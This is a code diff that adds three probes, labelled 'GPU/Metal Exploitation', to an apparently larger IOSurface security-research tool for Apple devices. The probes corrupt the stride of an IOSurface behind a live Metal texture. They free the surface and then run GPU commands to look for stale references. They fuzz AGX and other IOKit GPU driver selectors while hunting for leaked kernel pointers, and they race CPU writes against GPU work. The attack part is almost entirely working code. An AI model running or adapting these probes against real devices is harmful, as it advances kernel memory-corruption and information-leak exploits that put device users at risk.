@@ -15740,3 +15740,570 @@ void iosurface_research_race_exploit(ISRLogBlock _Nonnull log, ISRDoneBlock _Non
         done(res);
     });
 }
+
+// =============================================================================
+// MARK: - Round 24: GPU/Metal Exploitation
+// =============================================================================
+
+#pragma mark - Probe 73: Metal Texture Corruption
+
+void iosurface_research_metal_corrupt(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+    dispatch_async(dispatch_get_global_queue(0, 0), ^{
+        ISRSymbols sym;
+        isr_load(&sym);
+
+        log(@"METALCRPT: === Probe 73: Metal Texture Corruption ===");
+
+        NSTimeInterval t0 = [[NSDate date] timeIntervalSince1970];
+        int anomalies = 0;
+        int renderCorrupt = 0;
+        int staleGPU = 0;
+
+        void *metalLib = dlopen("/System/Library/Frameworks/Metal.framework/Metal", RTLD_LAZY);
+
+        if (!isr_stopped() && metalLib) {
+            log(@"METALCRPT: Metal framework loaded");
+
+            typedef id (*MTLCreateDeviceFn)(void);
+            MTLCreateDeviceFn createDevice = (MTLCreateDeviceFn)dlsym(metalLib, "MTLCreateSystemDefaultDevice");
+
+            if (!isr_stopped() && createDevice) {
+                id device = createDevice();
+                if (!isr_stopped() && device) {
+                    log([NSString stringWithFormat:@"METALCRPT: GPU device: %@", [device description]]);
+
+                    NSDictionary *props = @{
+                        @"IOSurfaceWidth": @256,
+                        @"IOSurfaceHeight": @256,
+                        @"IOSurfaceBytesPerElement": @4,
+                        @"IOSurfacePixelFormat": @(0x42475241),
+                    };
+                    IOSurfaceRef surf = sym.create((__bridge CFDictionaryRef)props);
+
+                    if (!isr_stopped() && surf) {
+                        uint32_t surfID = sym.getID(surf);
+                        log([NSString stringWithFormat:@"METALCRPT: Created surface ID=%u, alloc=%zu", surfID, (size_t)sym.getAllocSize(surf)]);
+
+                        sym.lock(surf, 0, NULL);
+                        void *base = sym.getBase(surf, 0);
+                        if (base) {
+                            uint32_t *pixels = (uint32_t *)base;
+                            size_t count = sym.getAllocSize(surf) / 4;
+                            for (size_t i = 0; i < count; i++) {
+                                pixels[i] = 0xDEADBEEF;
+                            }
+                        }
+                        sym.unlock(surf, 0, NULL);
+
+                        Class texDescClass = NSClassFromString(@"MTLTextureDescriptor");
+                        if (!isr_stopped() && texDescClass) {
+                            id texDesc = [[texDescClass alloc] init];
+
+                            SEL setWidthSel = NSSelectorFromString(@"setWidth:");
+                            SEL setHeightSel = NSSelectorFromString(@"setHeight:");
+                            SEL setPixelFmt = NSSelectorFromString(@"setPixelFormat:");
+
+                            if ([texDesc respondsToSelector:setWidthSel]) {
+                                NSUInteger w = 256;
+                                NSMethodSignature *sig = [texDesc methodSignatureForSelector:setWidthSel];
+                                NSInvocation *inv = [NSInvocation invocationWithMethodSignature:sig];
+                                [inv setSelector:setWidthSel]; [inv setArgument:&w atIndex:2]; [inv invokeWithTarget:texDesc];
+                            }
+                            if ([texDesc respondsToSelector:setHeightSel]) {
+                                NSUInteger h = 256;
+                                NSMethodSignature *sig = [texDesc methodSignatureForSelector:setHeightSel];
+                                NSInvocation *inv = [NSInvocation invocationWithMethodSignature:sig];
+                                [inv setSelector:setHeightSel]; [inv setArgument:&h atIndex:2]; [inv invokeWithTarget:texDesc];
+                            }
+                            if ([texDesc respondsToSelector:setPixelFmt]) {
+                                NSUInteger fmt = 80;
+                                NSMethodSignature *sig = [texDesc methodSignatureForSelector:setPixelFmt];
+                                NSInvocation *inv = [NSInvocation invocationWithMethodSignature:sig];
+                                [inv setSelector:setPixelFmt]; [inv setArgument:&fmt atIndex:2]; [inv invokeWithTarget:texDesc];
+                            }
+
+                            SEL newTexSel = NSSelectorFromString(@"newTextureWithDescriptor:iosurface:plane:level:");
+                            if (!isr_stopped() && [device respondsToSelector:newTexSel]) {
+                                log(@"METALCRPT: Device supports newTextureWithDescriptor:iosurface:");
+
+                                NSMethodSignature *sig = [device methodSignatureForSelector:newTexSel];
+                                NSInvocation *inv = [NSInvocation invocationWithMethodSignature:sig];
+                                [inv setSelector:newTexSel];
+                                [inv setArgument:&texDesc atIndex:2];
+                                [inv setArgument:&surf atIndex:3];
+                                NSUInteger plane = 0;
+                                [inv setArgument:&plane atIndex:4];
+                                NSUInteger level = 0;
+                                [inv setArgument:&level atIndex:5];
+                                [inv invokeWithTarget:device];
+
+                                __unsafe_unretained id texture = nil;
+                                [inv getReturnValue:&texture];
+
+                                if (!isr_stopped() && texture) {
+                                    log(@"METALCRPT: Metal texture created from IOSurface!");
+                                    anomalies++;
+
+                                    typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
+                                    SetValueFn setValue = (SetValueFn)dlsym(RTLD_DEFAULT, "IOSurfaceSetValue");
+
+                                    if (!isr_stopped() && setValue) {
+                                        setValue(surf, CFSTR("IOSurfaceBytesPerRow"), (__bridge CFTypeRef)@(65536));
+                                        log(@"METALCRPT: Set BytesPerRow=65536 while texture exists");
+
+                                        SEL newQueueSel = NSSelectorFromString(@"newCommandQueue");
+                                        if ([device respondsToSelector:newQueueSel]) {
+                                            id queue = [device performSelector:newQueueSel];
+                                            if (!isr_stopped() && queue) {
+                                                SEL cmdBufSel = NSSelectorFromString(@"commandBuffer");
+                                                id cmdBuf = [queue performSelector:cmdBufSel];
+                                                if (!isr_stopped() && cmdBuf) {
+                                                    SEL blitSel = NSSelectorFromString(@"blitCommandEncoder");
+                                                    id encoder = [cmdBuf performSelector:blitSel];
+                                                    if (!isr_stopped() && encoder) {
+                                                        [encoder performSelector:NSSelectorFromString(@"endEncoding")];
+                                                        [cmdBuf performSelector:NSSelectorFromString(@"commit")];
+                                                        [cmdBuf performSelector:NSSelectorFromString(@"waitUntilCompleted")];
+
+                                                        log(@"METALCRPT: GPU command completed with modified stride");
+
+                                                        sym.lock(surf, kIOSurfaceLockReadOnly, NULL);
+                                                        void *postBase = sym.getBase(surf, 0);
+                                                        if (postBase) {
+                                                            uint32_t *check = (uint32_t *)postBase;
+                                                            int changed = 0;
+                                                            for (int i = 0; i < 100; i++) {
+                                                                if (check[i] != 0xDEADBEEF) changed++;
+                                                            }
+                                                            if (changed > 0) {
+                                                                renderCorrupt++;
+                                                                log([NSString stringWithFormat:@"METALCRPT: CRITICAL — %d pixels changed after GPU render!", changed]);
+                                                            } else {
+                                                                log(@"METALCRPT: Data unchanged after GPU command");
+                                                            }
+                                                        }
+                                                        sym.unlock(surf, kIOSurfaceLockReadOnly, NULL);
+                                                    }
+                                                }
+                                            }
+                                        }
+
+                                        if (!isr_stopped()) {
+                                            log(@"METALCRPT: Phase 2 — destroy IOSurface while Metal texture lives");
+                                            CFRelease(surf);
+                                            surf = NULL;
+
+                                            SEL newQueueSel2 = NSSelectorFromString(@"newCommandQueue");
+                                            id queue2 = [device performSelector:newQueueSel2];
+                                            if (queue2) {
+                                                id cmdBuf2 = [queue2 performSelector:NSSelectorFromString(@"commandBuffer")];
+                                                if (cmdBuf2) {
+                                                    id encoder2 = [cmdBuf2 performSelector:NSSelectorFromString(@"blitCommandEncoder")];
+                                                    if (encoder2) {
+                                                        [encoder2 performSelector:NSSelectorFromString(@"endEncoding")];
+                                                        [cmdBuf2 performSelector:NSSelectorFromString(@"commit")];
+                                                        [cmdBuf2 performSelector:NSSelectorFromString(@"waitUntilCompleted")];
+                                                        staleGPU++;
+                                                        log(@"METALCRPT: GPU command succeeded AFTER surface destroy — stale GPU reference!");
+                                                    }
+                                                }
+                                            }
+                                        }
+                                    }
+                                } else {
+                                    log(@"METALCRPT: Failed to create Metal texture from IOSurface");
+                                }
+                            } else {
+                                log(@"METALCRPT: Device does not support newTextureWithDescriptor:iosurface:");
+                            }
+                        }
+
+                        if (surf) { CFRelease(surf); }
+                    }
+                }
+            }
+            dlclose(metalLib);
+        } else {
+            log(@"METALCRPT: Metal framework not available");
+        }
+
+        NSTimeInterval elapsed = [[NSDate date] timeIntervalSince1970] - t0;
+        log([NSString stringWithFormat:@"METALCRPT: Completed in %.2fs", elapsed]);
+        log([NSString stringWithFormat:@"METALCRPT: anomalies=%d renderCorrupt=%d staleGPU=%d", anomalies, renderCorrupt, staleGPU]);
+
+        NSString *verdict;
+        if (renderCorrupt > 0) verdict = @"CRITICAL — GPU wrote OOB with corrupted stride!";
+        else if (staleGPU > 0) verdict = @"HIGH — GPU stale reference after surface destroy";
+        else if (anomalies > 0) verdict = @"MEDIUM — Metal texture created from IOSurface";
+        else verdict = @"LOW — Metal/IOSurface integration blocked";
+        log([NSString stringWithFormat:@"METALCRPT: VERDICT: %@", verdict]);
+
+        NSDictionary *res = @{
+            @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+            @"anomalies": @(anomalies),
+            @"verdict": verdict,
+            @"elapsed": @(elapsed),
+            @"renderCorrupt": @(renderCorrupt),
+            @"staleGPU": @(staleGPU)
+        };
+        isr_checkpoint(@"ISR-MetalCorrupt-checkpoint.json", res);
+        isr_unload(&sym);
+        done(res);
+    });
+}
+
+#pragma mark - Probe 74: AGX GPU Driver Fuzzing
+
+void iosurface_research_agx_driver(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+    dispatch_async(dispatch_get_global_queue(0, 0), ^{
+        ISRSymbols sym;
+        isr_load(&sym);
+
+        log(@"AGXDRV: === Probe 74: AGX GPU Driver Fuzzing ===");
+
+        NSTimeInterval t0 = [[NSDate date] timeIntervalSince1970];
+        int anomalies = 0;
+        int accepted = 0;
+        int outputCount = 0;
+        int services_found = 0;
+
+        const char *serviceNames[] = {
+            "AGXAccelerator", "AGXG15P", "AGXAcceleratorG15P",
+            "AGXFamilyAccelerator", "AGXMetal", "AGXShared",
+            "AppleM1GPU", "AGXAcceleratorM1", "AGXFamilyAcceleratorM1",
+            "IOGPU", "IOGPUDevice", "IOAccelerator",
+            "AppleCLCD", "IOMobileFramebuffer",
+            "AppleAVE2", "AppleJPEGDriver", "AppleVXD394",
+            NULL
+        };
+        int totalServices = 17;
+
+        typedef mach_port_t (*IOServiceGetMatchingServiceFn)(mach_port_t, CFDictionaryRef);
+        typedef kern_return_t (*IOServiceOpenFn)(mach_port_t, task_port_t, uint32_t, io_connect_t *);
+        typedef kern_return_t (*IOConnectCallMethodFn)(io_connect_t, uint32_t, const uint64_t *, uint32_t, const void *, size_t, uint64_t *, uint32_t *, void *, size_t *);
+        typedef kern_return_t (*IOObjectReleaseFn)(mach_port_t);
+        typedef kern_return_t (*IOServiceCloseFn)(io_connect_t);
+        typedef CFMutableDictionaryRef (*IOServiceMatchingFn)(const char *);
+
+        void *iokitLib = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
+        if (!iokitLib) {
+            log(@"AGXDRV: Failed to load IOKit");
+            isr_unload(&sym);
+            done(@{@"status": @"ERROR", @"verdict": @"IOKit not available"});
+            return;
+        }
+
+        IOServiceGetMatchingServiceFn ioServiceGetMatching = (IOServiceGetMatchingServiceFn)dlsym(iokitLib, "IOServiceGetMatchingService");
+        IOServiceOpenFn ioServiceOpen = (IOServiceOpenFn)dlsym(iokitLib, "IOServiceOpen");
+        IOConnectCallMethodFn ioConnectCallMethod = (IOConnectCallMethodFn)dlsym(iokitLib, "IOConnectCallMethod");
+        IOObjectReleaseFn ioObjectRelease = (IOObjectReleaseFn)dlsym(iokitLib, "IOObjectRelease");
+        IOServiceCloseFn ioServiceClose = (IOServiceCloseFn)dlsym(iokitLib, "IOServiceClose");
+        IOServiceMatchingFn ioServiceMatching = (IOServiceMatchingFn)dlsym(iokitLib, "IOServiceMatching");
+
+        if (!ioServiceGetMatching || !ioServiceOpen || !ioConnectCallMethod || !ioObjectRelease || !ioServiceMatching) {
+            log(@"AGXDRV: Failed to load IOKit symbols");
+            dlclose(iokitLib);
+            isr_unload(&sym);
+            done(@{@"status": @"ERROR", @"verdict": @"IOKit symbols not available"});
+            return;
+        }
+
+        NSDictionary *surfProps = @{
+            @"IOSurfaceWidth": @64,
+            @"IOSurfaceHeight": @64,
+            @"IOSurfaceBytesPerElement": @4,
+            @"IOSurfacePixelFormat": @(0x42475241),
+        };
+        IOSurfaceRef testSurf = sym.create((__bridge CFDictionaryRef)surfProps);
+        uint32_t surfID = testSurf ? sym.getID(testSurf) : 0;
+
+        for (int si = 0; serviceNames[si] != NULL && !isr_stopped(); si++) {
+            CFMutableDictionaryRef matching = ioServiceMatching(serviceNames[si]);
+            if (!matching) continue;
+
+            mach_port_t service = ioServiceGetMatching(MACH_PORT_NULL, matching);
+            if (!service) continue;
+
+            services_found++;
+            log([NSString stringWithFormat:@"AGXDRV: Found service: %s", serviceNames[si]]);
+
+            for (uint32_t connType = 0; connType < 5 && !isr_stopped(); connType++) {
+                io_connect_t conn = 0;
+                kern_return_t kr = ioServiceOpen(service, mach_task_self(), connType, &conn);
+                if (kr != KERN_SUCCESS || !conn) continue;
+
+                log([NSString stringWithFormat:@"AGXDRV: Opened %s type=%u conn=%u", serviceNames[si], connType, conn]);
+
+                for (uint32_t sel = 0; sel < 100 && !isr_stopped(); sel++) {
+                    uint64_t scalarIn[2] = { surfID, 0 };
+                    uint64_t scalarOut[4] = {0};
+                    uint32_t scalarOutCnt = 4;
+
+                    kr = ioConnectCallMethod(conn, sel, scalarIn, 2, NULL, 0, scalarOut, &scalarOutCnt, NULL, NULL);
+
+                    if (kr != 0xe00002c2 && kr != 0xe00002bc) {
+                        accepted++;
+                        log([NSString stringWithFormat:@"AGXDRV: %s[%u] sel=%u kr=0x%x outCnt=%u out=[0x%llx,0x%llx]",
+                             serviceNames[si], connType, sel, kr, scalarOutCnt, scalarOut[0], scalarOut[1]]);
+
+                        if (scalarOutCnt > 0 && (scalarOut[0] != 0 || scalarOut[1] != 0)) {
+                            outputCount++;
+                            for (uint32_t oi = 0; oi < scalarOutCnt; oi++) {
+                                if ((scalarOut[oi] & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL ||
+                                    (scalarOut[oi] & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
+                                    anomalies++;
+                                    log([NSString stringWithFormat:@"AGXDRV: KERNEL POINTER? sel=%u out[%u]=0x%llx", sel, oi, scalarOut[oi]]);
+                                }
+                            }
+                        }
+                    }
+
+                    if (!isr_stopped() && sel < 20) {
+                        uint8_t structIn[128] = {0};
+                        memcpy(structIn, &surfID, 4);
+                        uint32_t marker = 0xDEADBEEF;
+                        memcpy(structIn + 4, &marker, 4);
+                        uint8_t structOut[256] = {0};
+                        size_t structOutSize = 256;
+
+                        kr = ioConnectCallMethod(conn, sel, NULL, 0, structIn, 128, NULL, NULL, structOut, &structOutSize);
+                        if (kr != 0xe00002c2 && kr != 0xe00002bc && structOutSize > 0) {
+                            int hasData = 0;
+                            for (size_t b = 0; b < structOutSize && b < 256; b++) {
+                                if (structOut[b] != 0) { hasData = 1; break; }
+                            }
+                            if (hasData) {
+                                accepted++;
+                                outputCount++;
+                                log([NSString stringWithFormat:@"AGXDRV: %s[%u] sel=%u struct returned %zu bytes!",
+                                     serviceNames[si], connType, sel, structOutSize]);
+                            }
+                        }
+                    }
+                }
+
+                ioServiceClose(conn);
+            }
+
+            if ((si + 1) % 4 == 0) {
+                log([NSString stringWithFormat:@"AGXDRV: Progress: %d/%d services scanned, %d accepted, %d outputs",
+                     si + 1, totalServices, accepted, outputCount]);
+            }
+
+            ioObjectRelease(service);
+        }
+
+        if (testSurf) CFRelease(testSurf);
+        dlclose(iokitLib);
+
+        NSTimeInterval elapsed = [[NSDate date] timeIntervalSince1970] - t0;
+        log([NSString stringWithFormat:@"AGXDRV: Completed in %.2fs", elapsed]);
+        log([NSString stringWithFormat:@"AGXDRV: services=%d accepted=%d outputs=%d anomalies=%d", services_found, accepted, outputCount, anomalies]);
+
+        NSString *verdict;
+        if (anomalies > 0) verdict = @"CRITICAL — kernel pointers leaked from GPU driver!";
+        else if (outputCount > 5) verdict = @"HIGH — GPU driver returns significant data";
+        else if (accepted > 0) verdict = @"MEDIUM — some GPU selectors accept input";
+        else if (services_found > 0) verdict = @"LOW — GPU services found but all selectors rejected";
+        else verdict = @"LOW — no GPU services accessible";
+        log([NSString stringWithFormat:@"AGXDRV: VERDICT: %@", verdict]);
+
+        NSDictionary *res = @{
+            @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+            @"anomalies": @(anomalies),
+            @"verdict": verdict,
+            @"elapsed": @(elapsed),
+            @"services": @(services_found),
+            @"accepted": @(accepted),
+            @"outputs": @(outputCount)
+        };
+        isr_checkpoint(@"ISR-AGXDriver-checkpoint.json", res);
+        isr_unload(&sym);
+        done(res);
+    });
+}
+
+#pragma mark - Probe 75: GPU DMA Race Condition
+
+void iosurface_research_gpu_dma_race(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
+    dispatch_async(dispatch_get_global_queue(0, 0), ^{
+        ISRSymbols sym;
+        isr_load(&sym);
+
+        log(@"GPUDMA: === Probe 75: GPU DMA Race Condition ===");
+        log(@"GPUDMA: Racing CPU writes vs GPU reads on shared IOSurface");
+
+        NSTimeInterval t0 = [[NSDate date] timeIntervalSince1970];
+        __block int anomalies = 0;
+        __block int raceHits = 0;
+        __block int tornReads = 0;
+        int iterations = 100;
+
+        void *metalLib = dlopen("/System/Library/Frameworks/Metal.framework/Metal", RTLD_LAZY);
+        if (!metalLib) {
+            log(@"GPUDMA: Metal not available");
+            isr_unload(&sym);
+            done(@{@"status": @"ERROR", @"verdict": @"Metal not available"});
+            return;
+        }
+
+        typedef id (*MTLCreateDeviceFn)(void);
+        MTLCreateDeviceFn createDevice = (MTLCreateDeviceFn)dlsym(metalLib, "MTLCreateSystemDefaultDevice");
+        id device = createDevice ? createDevice() : nil;
+
+        if (!device) {
+            log(@"GPUDMA: No Metal device");
+            dlclose(metalLib);
+            isr_unload(&sym);
+            done(@{@"status": @"ERROR", @"verdict": @"No GPU device"});
+            return;
+        }
+
+        NSDictionary *props = @{
+            @"IOSurfaceWidth": @128,
+            @"IOSurfaceHeight": @128,
+            @"IOSurfaceBytesPerElement": @4,
+            @"IOSurfacePixelFormat": @(0x42475241),
+        };
+
+        for (int iter = 0; iter < iterations && !isr_stopped(); iter++) {
+            IOSurfaceRef surf = sym.create((__bridge CFDictionaryRef)props);
+            if (!surf) continue;
+
+            sym.lock(surf, 0, NULL);
+            void *base = sym.getBase(surf, 0);
+            if (base) {
+                memset(base, 0xAA, sym.getAllocSize(surf));
+            }
+            sym.unlock(surf, 0, NULL);
+
+            Class texDescClass = NSClassFromString(@"MTLTextureDescriptor");
+            id texDesc = texDescClass ? [[texDescClass alloc] init] : nil;
+
+            if (texDesc) {
+                SEL setW = NSSelectorFromString(@"setWidth:");
+                SEL setH = NSSelectorFromString(@"setHeight:");
+                SEL setPF = NSSelectorFromString(@"setPixelFormat:");
+
+                if ([texDesc respondsToSelector:setW]) {
+                    NSUInteger val = 128;
+                    NSMethodSignature *msig = [texDesc methodSignatureForSelector:setW];
+                    NSInvocation *minv = [NSInvocation invocationWithMethodSignature:msig];
+                    [minv setSelector:setW]; [minv setArgument:&val atIndex:2]; [minv invokeWithTarget:texDesc];
+                }
+                if ([texDesc respondsToSelector:setH]) {
+                    NSUInteger val = 128;
+                    NSMethodSignature *msig = [texDesc methodSignatureForSelector:setH];
+                    NSInvocation *minv = [NSInvocation invocationWithMethodSignature:msig];
+                    [minv setSelector:setH]; [minv setArgument:&val atIndex:2]; [minv invokeWithTarget:texDesc];
+                }
+                if ([texDesc respondsToSelector:setPF]) {
+                    NSUInteger val = 80;
+                    NSMethodSignature *msig = [texDesc methodSignatureForSelector:setPF];
+                    NSInvocation *minv = [NSInvocation invocationWithMethodSignature:msig];
+                    [minv setSelector:setPF]; [minv setArgument:&val atIndex:2]; [minv invokeWithTarget:texDesc];
+                }
+
+                SEL newTexSel = NSSelectorFromString(@"newTextureWithDescriptor:iosurface:plane:level:");
+                if ([device respondsToSelector:newTexSel]) {
+                    NSMethodSignature *tsig = [device methodSignatureForSelector:newTexSel];
+                    NSInvocation *tinv = [NSInvocation invocationWithMethodSignature:tsig];
+                    [tinv setSelector:newTexSel];
+                    [tinv setArgument:&texDesc atIndex:2];
+                    [tinv setArgument:&surf atIndex:3];
+                    NSUInteger zero = 0;
+                    [tinv setArgument:&zero atIndex:4];
+                    [tinv setArgument:&zero atIndex:5];
+                    [tinv invokeWithTarget:device];
+
+                    __unsafe_unretained id texture = nil;
+                    [tinv getReturnValue:&texture];
+
+                    if (texture) {
+                        __block volatile int cpuDone = 0;
+
+                        dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INTERACTIVE, 0), ^{
+                            for (int w = 0; w < 1000 && !isr_stopped(); w++) {
+                                sym.lock(surf, 0, NULL);
+                                void *b = sym.getBase(surf, 0);
+                                if (b) memset(b, 0xBB, 128 * 128 * 4);
+                                sym.unlock(surf, 0, NULL);
+                            }
+                            cpuDone = 1;
+                        });
+
+                        SEL newQSel = NSSelectorFromString(@"newCommandQueue");
+                        id queue = [device performSelector:newQSel];
+                        if (queue) {
+                            for (int g = 0; g < 50 && !isr_stopped(); g++) {
+                                id cmdBuf = [queue performSelector:NSSelectorFromString(@"commandBuffer")];
+                                if (cmdBuf) {
+                                    id enc = [cmdBuf performSelector:NSSelectorFromString(@"blitCommandEncoder")];
+                                    if (enc) {
+                                        [enc performSelector:NSSelectorFromString(@"endEncoding")];
+                                        [cmdBuf performSelector:NSSelectorFromString(@"commit")];
+                                        [cmdBuf performSelector:NSSelectorFromString(@"waitUntilCompleted")];
+                                    }
+                                }
+                            }
+                        }
+
+                        while (!cpuDone && !isr_stopped()) { usleep(1000); }
+
+                        sym.lock(surf, kIOSurfaceLockReadOnly, NULL);
+                        void *checkBase = sym.getBase(surf, 0);
+                        if (checkBase) {
+                            uint8_t *bytes = (uint8_t *)checkBase;
+                            int aa = 0, bb = 0, other = 0;
+                            for (int i = 0; i < 128 * 128 * 4; i += 64) {
+                                if (bytes[i] == 0xAA) aa++;
+                                else if (bytes[i] == 0xBB) bb++;
+                                else other++;
+                            }
+                            if (other > 0) {
+                                tornReads++;
+                                log([NSString stringWithFormat:@"GPUDMA: TORN READ iter=%d — aa=%d bb=%d other=%d", iter, aa, bb, other]);
+                            }
+                            if (aa > 0 && bb > 0) {
+                                raceHits++;
+                            }
+                        }
+                        sym.unlock(surf, kIOSurfaceLockReadOnly, NULL);
+                    }
+                }
+            }
+
+            CFRelease(surf);
+
+            if ((iter + 1) % 25 == 0) {
+                log([NSString stringWithFormat:@"GPUDMA: iter %d/%d — raceHits=%d tornReads=%d anomalies=%d",
+                     iter + 1, iterations, raceHits, tornReads, anomalies]);
+            }
+        }
+
+        dlclose(metalLib);
+
+        NSTimeInterval elapsed = [[NSDate date] timeIntervalSince1970] - t0;
+        log([NSString stringWithFormat:@"GPUDMA: Completed %d iterations in %.2fs", iterations, elapsed]);
+        log([NSString stringWithFormat:@"GPUDMA: raceHits=%d tornReads=%d anomalies=%d", raceHits, tornReads, anomalies]);
+
+        NSString *verdict;
+        if (tornReads > 0) verdict = @"CRITICAL — GPU DMA torn reads detected! Memory corruption possible";
+        else if (raceHits > 10) verdict = @"HIGH — significant CPU/GPU race window";
+        else if (raceHits > 0) verdict = @"MEDIUM — minor race hits detected";
+        else verdict = @"LOW — no GPU DMA race exploitable";
+        log([NSString stringWithFormat:@"GPUDMA: VERDICT: %@", verdict]);
+
+        NSDictionary *res = @{
+            @"status": isr_stopped() ? @"STOPPED" : @"DONE",
+            @"anomalies": @(anomalies),
+            @"verdict": verdict,
+            @"elapsed": @(elapsed),
+            @"raceHits": @(raceHits),
+            @"tornReads": @(tornReads)
+        };
+        isr_checkpoint(@"ISR-GPUDMARace-checkpoint.json", res);
+        isr_unload(&sym);
+        done(res);
+    });
+}
